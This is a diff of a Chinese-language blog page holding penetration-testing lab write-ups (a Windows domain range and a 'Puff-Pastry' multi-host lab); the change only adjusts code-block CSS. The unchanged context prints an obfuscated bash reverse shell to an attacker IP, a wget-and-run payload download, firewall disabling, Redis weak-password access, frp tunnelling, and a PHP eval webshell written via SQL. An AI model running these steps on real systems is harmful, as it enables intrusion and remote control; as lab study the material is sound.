@@ -1524,7 +1524,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_40.png" alt="" /></figure>
 </p>
 <p>原来是防火墙没关</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND  <span style="color:#e6db74">&#39;netsh advfirewall set allprofiles state off&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set COMMAND  <span style="color:#e6db74">&#39;netsh advfirewall set allprofiles state off&#39;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_41.png" alt="" /></figure>
@@ -1551,7 +1551,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/%e7%ba%a2%e6%97%a5%e9%9d%b6%e5%9c%ba1-win%e5%9f%9f_image_47.png" alt="" /></figure>
 <p>之后再beacon进行交互</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sleep <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># 进入交互模式</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sleep <span style="color:#ae81ff">0</span>  <span style="color:#75715e"># 进入交互模式</span>
 </span></span><span style="display:flex;"><span>getsystem <span style="color:#75715e"># 提权</span>
 </span></span><span style="display:flex;"><span>net view <span style="color:#75715e"># 查看当前网络中的其他机器</span>
 </span></span></code></pre></div><p>查看完之后再target视图中可以看到其他机器了,如果没有的话就扫描一下
@@ -1631,11 +1631,11 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_4.png" alt="" /></figure>
 </p>
 <p>拿一个反弹shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;bash -i 5&lt;&gt;/dev/tcp/192.168.122.102/1234 0&gt;&amp;5 1&gt;&amp;5&#39;</span> | base64
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>bash -c <span style="color:#f92672">{</span>echo ,YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvMTIzNCAwPiY1IDE+JjUK<span style="color:#f92672">}</span>|<span style="color:#f92672">{</span>base64,-d<span style="color:#f92672">}</span>|<span style="color:#f92672">{</span>bash,-i<span style="color:#f92672">}</span>
 </span></span></code></pre></div><p>成功拿到shell</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> $ pwncat  -l <span style="color:#ae81ff">1234</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> $ pwncat  -l <span style="color:#ae81ff">1234</span>
 </span></span><span style="display:flex;"><span>id
 </span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>/usr/bin/script -qc /bin/bash /dev/null
@@ -1643,7 +1643,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span></code></pre></div><h3 id="内网扫描">内网扫描</h3>
 <p>然后开始扫描内网.</p>
 <p>这里不知道为啥出现了三台机器(多了一台192.168.100.1),192.168.100.3才是我接下来要利用的thinkphp机器.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@74d34925b057:/tmp# ifconfig
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@74d34925b057:/tmp# ifconfig
 </span></span><span style="display:flex;"><span>eth0: flags<span style="color:#f92672">=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span style="color:#ae81ff">1500</span>
 </span></span><span style="display:flex;"><span>        inet 192.168.100.2  netmask 255.255.255.0  broadcast 192.168.110.255
 </span></span><span style="display:flex;"><span>        ether 02:42:c0:a8:6e:02  txqueuelen <span style="color:#ae81ff">0</span>  <span style="color:#f92672">(</span>Ethernet<span style="color:#f92672">)</span>
@@ -1690,7 +1690,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PocScan http://192.168.100.2:8080/ poc-yaml-shiro-key <span style="color:#f92672">[{</span>mode cbc<span style="color:#f92672">}</span> <span style="color:#f92672">{</span>key kPH+bIxk5D2deZiIxcaaaA<span style="color:#f92672">==}]</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PocScan http://192.168.100.3 poc-yaml-thinkphp5-controller-rce 
 </span></span></code></pre></div><h3 id="配置端口转发">配置端口转发</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.122.102 wsl kali
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>192.168.122.102 wsl kali
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>192.168.100.2 shiro
 </span></span><span style="display:flex;"><span>192.168.100.3 thinkphp
@@ -1699,7 +1699,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_5.png" alt="|600" /><figcaption>|600</figcaption></figure>
 </p>
 <p>接下来需要配置端口转发了,这个我没啥经验,用我wsl里面装过的frp吧</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wsl kali
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wsl kali
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>l1uyun workspace/frp » ./frps -c frps.toml
 </span></span><span style="display:flex;"><span>2024-08-19 09:57:33.478 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>frps/root.go:105<span style="color:#f92672">]</span> frps uses config file: frps.toml       
@@ -1709,7 +1709,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>2024-08-19 09:59:30.951 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>proxy/tcp.go:82<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> tcp proxy listen port <span style="color:#f92672">[</span>9999<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>2024-08-19 09:59:30.951 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>server/control.go:399<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> new proxy <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> type <span style="color:#f92672">[</span>tcp<span style="color:#f92672">]</span> success
 </span></span><span style="display:flex;"><span>2024-08-19 09:59:45.095 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>proxy/proxy.go:115<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> proxy closing
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shiro
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shiro
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>root@653a3ab3924e:/tmp# ./frpc -c shiro.toml
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.648 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>sub/root.go:142<span style="color:#f92672">]</span> start frpc service <span style="color:#66d9ef">for</span> config file <span style="color:#f92672">[</span>shiro.toml<span style="color:#f92672">]</span>
@@ -1717,7 +1717,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.652 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client/service.go:286<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> login to server success, get run id <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.652 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>proxy/proxy_manager.go:173<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> proxy added: <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>2024-08-19 01:59:30.653 <span style="color:#f92672">[</span>I<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client/control.go:168<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>f73e9824ff9889ea<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>shiro<span style="color:#f92672">]</span> start proxy success
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">shiro</span>.<span style="color:#a6e22e">toml</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">shiro</span>.<span style="color:#a6e22e">toml</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
@@ -1743,7 +1743,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_8.png" alt="" /></figure>
 <p>拿shell</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;YmFzaCAtaSA1PD4vZGV2L3RjcC8xOTIuMTY4LjEyMi4xMDIvNDQ0NCAwPiY1IDE+JjUK&#39;</span> |base64 -d &gt; /tmp/a.sh
 </span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">777</span> /tmp/a.sh
 </span></span><span style="display:flex;"><span>ls -al /tmp/a.sh
 </span></span><span style="display:flex;"><span>bash /tmp/a.sh
@@ -1751,9 +1751,9 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_9.png" alt="" /></figure>
 <p>成功拿到shell</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget 192.168.122.102/ppp -O /tmp/ppp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget 192.168.122.102/ppp -O /tmp/ppp
 </span></span><span style="display:flex;"><span>php /tmp/ppp
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..<span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> &lt;<span style="color:#f92672">()</span>&gt; pwncat  -l <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>..<span style="color:#f92672">[</span>$<span style="color:#f92672">]</span> &lt;<span style="color:#f92672">()</span>&gt; pwncat  -l <span style="color:#ae81ff">4444</span>
 </span></span><span style="display:flex;"><span>id
 </span></span><span style="display:flex;"><span>Linux 94a2babbcac5 6.5.0-13parrot1-amd64 <span style="color:#75715e">#1 SMP PREEMPT_DYNAMIC Debian 6.5.13-1parrot1 (2023-12-19) x86_64 Linux</span>
 </span></span><span style="display:flex;"><span>sh: w: not found
@@ -1762,7 +1762,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>/ $ uid<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>,82<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>/ $ 
 </span></span></code></pre></div><p>这里有python3,给shell升级一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>which python python2 python3
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>which python python2 python3
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>;
 </span></span><span style="display:flex;"><span>
@@ -1773,12 +1773,12 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>stty raw -echo;fg 
 </span></span></code></pre></div><p>拿到flag</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ cat /f*
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.1$ cat /f*
 </span></span><span style="display:flex;"><span>cat /f*
 </span></span><span style="display:flex;"><span>WSS-Studio<span style="color:#f92672">{</span>ThinkPHP-84d786a4-b47c-4fcb-a377-be6241d5bf10<span style="color:#f92672">}</span>
 </span></span></code></pre></div><h3 id="内网扫描-1">内网扫描</h3>
 <p>可以看到这台thinkphp机器是有两个内网地址的</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ ifconfig
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/ $ ifconfig
 </span></span><span style="display:flex;"><span>eth0      Link encap:Ethernet  HWaddr 02:42:C0:A8:64:03  
 </span></span><span style="display:flex;"><span>          inet addr:192.168.100.3  Bcast:192.168.100.255  Mask:255.255.255.0
 </span></span><span style="display:flex;"><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
@@ -1803,7 +1803,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000
 </span></span><span style="display:flex;"><span>          RX bytes:4014368 <span style="color:#f92672">(</span>3.8 MiB<span style="color:#f92672">)</span>  TX bytes:4014368 <span style="color:#f92672">(</span>3.8 MiB<span style="color:#f92672">)</span>
 </span></span></code></pre></div><p>上fscan扫一下内网</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>start infoscan
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>start infoscan
 </span></span><span style="display:flex;"><span>trying RunIcmp2
 </span></span><span style="display:flex;"><span>The current user permissions unable to send icmp packets
 </span></span><span style="display:flex;"><span>start ping
@@ -1852,7 +1852,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 扫描结束,耗时: 7m48.941223927s
 </span></span></code></pre></div><h3 id="配置socks代理">配置socks代理</h3>
 <p>我这为啥又出现了一个多的ip&hellip;.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.85.101.4 thinkphp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>10.85.101.4 thinkphp
 </span></span><span style="display:flex;"><span>10.85.101.3 phpmyadmin
 </span></span><span style="display:flex;"><span>10.85.101.2 redis
 </span></span><span style="display:flex;"><span>10.85.101.1 ???  是运行docker的parrot???
@@ -1860,7 +1860,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_10.png" alt="" /></figure>
 <p>这里就直接配置个socks代理吧</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-toml" data-lang="toml"><span style="display:flex;"><span><span style="color:#a6e22e">serverAddr</span> = <span style="color:#e6db74">&#34;192.168.122.102&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">serverPort</span> = <span style="color:#ae81ff">7000</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>[[<span style="color:#a6e22e">proxies</span>]]
@@ -1878,7 +1878,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </p>
 <h2 id="redis">redis</h2>
 <p>使用proxychains来实现使用代理</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*redis*&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>☁  workspace  sudo proxychains4  nmap -sT -Pn 10.85.101.2 -p6379 --script<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;*redis*&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -1897,7 +1897,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.18 seconds
 </span></span></code></pre></div><p>有个弱口令</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└<span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>&gt; sudo proxychains4  redis-cli -h 10.85.101.2 -p <span style="color:#ae81ff">6379</span> -a <span style="color:#ae81ff">12345</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└<span style="color:#f92672">[</span>~/workspace<span style="color:#f92672">]</span>&gt; sudo proxychains4  redis-cli -h 10.85.101.2 -p <span style="color:#ae81ff">6379</span> -a <span style="color:#ae81ff">12345</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.17
@@ -1939,7 +1939,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_18.png" alt="" /></figure>
 <p>写入webshell</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">select</span> <span style="color:#e6db74">&#34;&lt;?php @eval($_POST[1]);?&gt;&#34;</span> <span style="color:#66d9ef">into</span> outfile <span style="color:#e6db74">&#39;/var/www/html/shell.php&#39;</span>
 </span></span></code></pre></div><p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_19.png" alt="" /></figure>
@@ -1964,7 +1964,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_24.png" alt="" /></figure>
 </p>
 <h3 id="内网扫描-2">内网扫描</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>root:/tmp<span style="color:#f92672">)</span> $ ip a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>root:/tmp<span style="color:#f92672">)</span> $ ip a
 </span></span><span style="display:flex;"><span>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span style="color:#ae81ff">65536</span> qdisc noqueue state UNKNOWN qlen <span style="color:#ae81ff">1000</span>
 </span></span><span style="display:flex;"><span>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
 </span></span><span style="display:flex;"><span>    inet 127.0.0.1/8 scope host lo
@@ -1981,7 +1981,7 @@ Php 5.5 版本以上的将 preg_replace 的 /e修饰符给废弃掉了</p>
 <figure class="md-figure">
   <img loading="lazy" decoding="async" src="https://img.l1uyun.one/Puff-Pastry%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95_image_25.png" alt="" /></figure>
 <p>跟之前一样,多了一个172.56.102.1,这到底是啥???🤔,大概率就是我运行docker的parrot机器了</p></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>172.56.102.1:22 open
